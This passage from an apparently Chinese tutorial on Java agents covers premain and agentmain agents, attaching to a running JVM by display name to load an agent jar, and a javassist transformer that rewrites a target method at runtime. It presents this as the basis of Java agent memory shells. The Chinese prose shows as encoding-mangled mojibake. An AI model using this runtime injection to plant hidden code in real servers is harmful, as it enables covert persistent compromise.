alt="image-20241030221232096"></p></li></ul><p><strong>ä½¿ç”¨ideaæ‰“åŒ…</strong></p><p>è¿™ç§æ–¹å¼ä¸éœ€è¦æå‰ç¼–è¯‘ï¼Œä»–åœ¨buildçš„æ—¶å€™å°±ä¼šå¸®æˆ‘ä»¬ç¼–è¯‘</p><p>æˆ‘ä»¬é€‰æ‹©é€‰æ‹©<code>Project Structure</code> -&gt; <code>Artifacts</code> -&gt; <code>JAR</code> -&gt; <code>From modules with dependencies</code></p><p><img src="https://cdn.clown2024.cn/image-20241030221418303.png" alt="image-20241030221418303"></p><p><img src="https://cdn.clown2024.cn/image-20241030221442499.png" alt="image-20241030221442499"></p><p><img src="https://cdn.clown2024.cn/image-20241030221521466.png" alt="image-20241030221521466"></p><p>ç„¶åé€‰æ‹©é€‰æ‹©<code>Build</code> -&gt; <code>Build Artifacts</code> -&gt; <code>Build</code></p><p>ç„¶åå°±å¯ä»¥åœ¨outç›®å½•çœ‹åˆ°æˆ‘ä»¬ç”Ÿæˆçš„jaråŒ…äº†</p><p><img src="https://cdn.clown2024.cn/image-20241030221714027.png" alt="image-20241030221714027"></p><p>ç°åœ¨æˆ‘ä»¬çš„agentç±»å·²ç»åˆ›å»ºå¥½äº†ï¼Œæˆ‘ä»¬éœ€è¦å†åˆ›å»ºä¸€ä¸ªæ–°çš„ç›®æ ‡ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·ä½¿ç”¨MFæ¥æ‰“åŒ…ï¼Œåˆ›å»ºä¸€ä¸ªMFæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Main-Class: org.example.Main<br><br></code></pre></td></tr></table></figure><p>ç„¶åæ‰“æˆjaråŒ…</p><p>ç°åœ¨æˆ‘ä»¬å°±å¾—åˆ°ä¸¤ä¸ªjaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241030222419726.png" alt="image-20241030222419726"></p><p>ç„¶åæˆ‘ä»¬åªè¦æ·»åŠ ä¸€ä¸ªå‚æ•°å°±èƒ½åº”ç”¨agent.jaråŒ…ï¼Œæ ¼å¼åœ¨å®˜æ–¹æ–‡æ¡£ä¹Ÿæœ‰ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-javaagent:&lt;jarpath&gt;[=&lt;options&gt;]<br># optionsæ˜¯ä¼ é€’ç»™ä»£ç†çš„å‚æ•°ï¼Œpremainçš„agentArgså­—æ®µå°±æ˜¯ç”¨æ¥æ¥å—å‚æ•°çš„<br></code></pre></td></tr></table></figure><p>ç°åœ¨æ‰§è¡Œä¸‹é¢å‘½ä»¤è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -javaagent:agent.jar -jar TestAgent.jar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030223732827.png" alt="image-20241030223732827"></p><h2 id="agentmain-agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h2><p>agentmain-Agentå°±æ˜¯èƒ½å¤Ÿåœ¨JVMå¯åŠ¨ååŠ è½½å¹¶ä¿®æ”¹å­—èŠ‚ç </p><p>ç¼–å†™è¯¥ç±»éœ€è¦å®ç°agentmainæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;è°ƒç”¨äº†agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·å†™ä¸€ä¸ªMFæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br><br></code></pre></td></tr></table></figure><p>ç„¶åå†™ä¸€ä¸ªä¸€ç›´è¿è¡Œçš„ç›®æ ‡ç±»æ–¹ä¾¿è§‚å¯Ÿç»“æœ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯agentmainå°±ä¸æ˜¯é€šè¿‡å‘½ä»¤è¡ŒæŒ‡å®šå‚æ•°çš„å½¢å¼å¯åŠ¨äº†ï¼Œå®˜æ–¹ä¸ºäº†å®ç°å¯åŠ¨ååŠ è½½ï¼Œæä¾›äº†<code>Attach API</code>ã€‚Attach API å¾ˆç®€å•ï¼Œåªæœ‰ 2 ä¸ªä¸»è¦çš„ç±»ï¼Œéƒ½åœ¨ <code>com.sun.tools.attach</code>åŒ…é‡Œé¢ã€‚</p><p>è¿™ä¸¤ä¸ªç±»ä¸º<code>com.sun.tools.attach.VirtualMachine</code>ç±»å’Œ<code>com.sun.tools.attach.VirtualMachineDescriptor</code>ç±»</p><blockquote><p>è¿™ä¸¤ä¸ªç±»åœ¨tools.jaråŒ…ä¸­ï¼Œå¯èƒ½è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸‹jaråŒ…ï¼Œå› ä¸ºæˆ‘åœ¨jdk8u65æµ‹è¯•çš„æ—¶å€™ä»–æ²¡æœ‰è‡ªåŠ¨å¼•å…¥</p><p><img src="https://cdn.clown2024.cn/image-20241030232514951.png" alt="image-20241030232514951"></p></blockquote><h3 id="virtualmachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h3><p>è¯¥ç±»å¯ä»¥å®ç°è·å–JVMä¿¡æ¯ï¼Œå†…å­˜dumpã€ç°æˆdumpã€ç±»ä¿¡æ¯ç»Ÿè®¡ï¼ˆä¾‹å¦‚JVMåŠ è½½çš„ç±»ï¼‰ç­‰åŠŸèƒ½ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»™è¯¥ç±»çš„attachæ–¹æ³•ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Šï¼Œä¹‹åå°±å¯ä»¥å¯¹è¯¥JVMåŠè¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚æ³¨å…¥agentå°±æ˜¯ä»¥è¿™ç§å½¢å¼</p><p>ä¸‹é¢æ˜¯è¯¥ç±»çš„ä¸»è¦æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//å…è®¸æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š<br>VirtualMachine.attach()<br> <br>//å‘JVMæ³¨å†Œä¸€ä¸ªä»£ç†ç¨‹åºagentï¼Œåœ¨è¯¥agentçš„ä»£ç†ç¨‹åºä¸­ä¼šå¾—åˆ°ä¸€ä¸ªInstrumentationå®ä¾‹ï¼Œè¯¥å®ä¾‹å¯ä»¥ åœ¨classåŠ è½½å‰æ”¹å˜classçš„å­—èŠ‚ç ï¼Œä¹Ÿå¯ä»¥åœ¨classåŠ è½½åé‡æ–°åŠ è½½ã€‚åœ¨è°ƒç”¨Instrumentationå®ä¾‹çš„æ–¹æ³•æ—¶ï¼Œè¿™äº›æ–¹æ³•ä¼šä½¿ç”¨ClassFileTransformeræ¥å£ä¸­æä¾›çš„æ–¹æ³•è¿›è¡Œå¤„ç†<br>VirtualMachine.loadAgent()<br> <br>//è·å¾—å½“å‰æ‰€æœ‰çš„JVMåˆ—è¡¨<br>VirtualMachine.list()<br> <br>//è§£é™¤ä¸ç‰¹å®šJVMçš„è¿æ¥<br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªæ–¹æ³•è¯•è¯•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030234554068.png" alt="image-20241030234554068"></p><h3 id="virtualmachinedescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h3><p>è¯¥ç±»å°±æ˜¯ä¸€ä¸ªæè¿°ç‰¹å®šè™šæ‹Ÿæœºçš„ç±»ï¼Œä»å‰é¢listæ–¹æ³•è·å–çš„è¿”å›å€¼ä¹Ÿèƒ½çŸ¥é“ï¼Œä»–å°±ä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå…¶æ–¹æ³•å¯ä»¥è·å–è™šæ‹Ÿæœºçš„å„ç§ä¿¡æ¯å¦‚PIDã€è™šæ‹Ÿæœºåç§°ç­‰ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>            System.out.println(virtualMachineDescriptor.displayName());<br>            System.out.println(virtualMachineDescriptor.id());<span class="hljs-comment">//æ‰“å°PID</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030235436825.png" alt="image-20241030235436825"></p><h3 id="æ³¨å…¥agent"><a href="#æ³¨å…¥agent" class="headerlink" title="æ³¨å…¥agent"></a>æ³¨å…¥agent</h3><p>ç°åœ¨çŸ¥é“äº†è¿™ä¸¤ä¸ªç±»æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº†</p><p>åŒæ ·çš„æˆ‘ä»¬å‰é¢çš„agentè¦æ‰“æˆjaråŒ…ï¼Œç„¶åæˆ‘ä»¬è¿˜è¦å†™ä¸€ä¸ªinjectç±»ç”¨äºæ³¨å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºç›®æ ‡ç±»åˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent.jar&quot;</span>);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå…ˆå°†ç›®æ ‡ç±»è¿è¡Œèµ·æ¥ï¼Œä¸€æ®µæ—¶é—´åå¼€å¯æˆ‘ä»¬çš„injectç±»</p><p><img src="https://cdn.clown2024.cn/image-20241031000148056.png" alt="image-20241031000148056"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ³¨å…¥ç›®æ ‡ç±»ä¸­</p><h1 id="instrumentationå®ä¾‹"><a href="#Instrumentationå®ä¾‹" class="headerlink" title="Instrumentationå®ä¾‹"></a>Instrumentationå®ä¾‹</h1><h2 id="instrumentationä»‹ç»"><a href="#Instrumentationä»‹ç»" class="headerlink" title="Instrumentationä»‹ç»"></a>Instrumentationä»‹ç»</h2><p>åœ¨å®ç°agentçš„æ–¹æ³•çš„æ—¶å€™ï¼Œæˆ‘ä»¬å‘ç°é™¤äº†å‚æ•°çš„æ¥å—ï¼Œä»–è¿˜æœ‰å¦ä¸€ä¸ªInstrumentationç±»å‹çš„å‚æ•°ï¼Œè¯¥ç±»åœ¨java.lang.instrumentåŒ…ä¸‹ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯Instrumentationå‘¢</p><p>Instrumentation æ˜¯ JVMTIAgentï¼ˆJVM Tool Interface Agentï¼‰çš„ä¸€éƒ¨åˆ†ï¼ŒJava agent é€šè¿‡è¿™ä¸ªç±»å’Œç›®æ ‡ JVM è¿›è¡Œäº¤äº’ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹æ•°æ®çš„æ•ˆæœã€‚</p><p>Instrumentationæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶å¸¸ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ï¼Œç›¸å½“äºé‡æ–°åŠ è½½ä½¿æˆ‘ä»¬çš„ä¿®æ”¹ç”Ÿæ•ˆ</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br> <br>    <span class="hljs-comment">//åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦èƒ½è¢«ä¿®æ”¹</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// è·å–ç›®æ ‡æ‰€æœ‰å·²ç»åŠ è½½çš„ç±»ã€‚</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//è·å–ä¸€ä¸ªå¯¹è±¡çš„å¤§å°</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br> <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="instrumentationä½¿ç”¨"><a href="#Instrumentationä½¿ç”¨" class="headerlink" title="Instrumentationä½¿ç”¨"></a>Instrumentationä½¿ç”¨</h2><p>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å‰é¢çš„agentMainæ¥è¯•ä¸€è¯•Instrumentationçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬ç»™ç›®æ ‡ç±»æ·»åŠ ä¸€ä¸ªClassFileTransformerç±»è½¬æ¢å™¨</p><p>ClassFileTransformeræ¥å£ä¸‹åªæœ‰ä¸€ä¸ªtransformæ–¹æ³•ï¼Œé‡å†™è¯¥æ–¹æ³•å³å¯è½¬æ¢ä»»æ„ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–°çš„è¢«å–ä»£çš„ç±»æ–‡ä»¶ï¼Œåœ¨ java agent å†…å­˜é©¬ä¸­ä¾¿æ˜¯åœ¨è¯¥æ–¹æ³•ä¸‹é‡å†™æ¶æ„ä»£ç ï¼Œä»è€Œä¿®æ”¹åŸæœ‰ç±»æ–‡ä»¶ä»£ç é€»è¾‘ï¼Œä¸ addTransformer æ­é…ä½¿ç”¨ã€‚</p><p>ç›®æ ‡ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            Hello();<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯æ”¹ä¸€ä¸‹æˆ‘ä»¬çš„agentMain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//è·å–æ‰€æœ‰å·²åŠ è½½çš„ç±»</span><br>        <span class="hljs-comment">//è·å–ç›®æ ‡JVMåŠ è½½çš„å…¨éƒ¨ç±»</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>))&#123;<br><br>                <span class="hljs-comment">//æ·»åŠ ä¸€ä¸ªtransformeråˆ°Instrumentationï¼Œå¹¶é‡æ–°è§¦å‘ç›®æ ‡ç±»åŠ è½½</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;è°ƒç”¨äº†agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯æˆ‘ä»¬çš„ClassFileTransformerï¼Œè¿™é‡Œç”¨javassistæ¥ä¿®æ”¹ç±»</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.example.Main&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;Hello&quot;</span>);<br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„MFæ–‡ä»¶éœ€è¦ä¿®æ”¹æˆå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br><br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ç”¨mavenæ‰“jaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241031113452048.png" alt="image-20241031113452048"></p><blockquote><p>mavenæ‰“æˆjaråŒ…æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œä»–ä¼šé»˜è®¤æ›¿æ¢ä½ çš„MFæ–‡ä»¶å˜æˆè¿™æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241031114835052.png" alt="image-20241031114835052"></p><p>æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ›¿æ¢ä¸€ä¸‹jaråŒ…é‡Œé¢çš„MFæ–‡ä»¶ï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥é…ç½®ä¸€ä¸‹mavençš„æ‰“åŒ…æ’ä»¶è®©ä»–è‡ªåŠ¨ç”ŸæˆMFæ–‡ä»¶</p><figure 